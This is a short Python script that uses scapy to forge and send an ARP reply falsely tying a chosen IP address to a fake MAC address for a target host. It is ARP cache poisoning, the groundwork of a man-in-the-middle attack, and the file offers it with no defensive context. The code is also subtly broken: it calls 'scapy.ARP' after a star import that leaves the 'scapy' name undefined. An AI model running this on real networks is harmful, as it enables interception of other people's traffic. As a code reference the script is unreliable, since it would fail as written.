from scapy.all import *


def spoofing():
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=2, hwdst="78:94:b4:de:fd:c4", pdst="10.33.67.174", psrc="10.13.33.37", hwsrc="de:ad:be:ef:ca:fe")
    # sending the packet
    scapy.send(packet, verbose=False)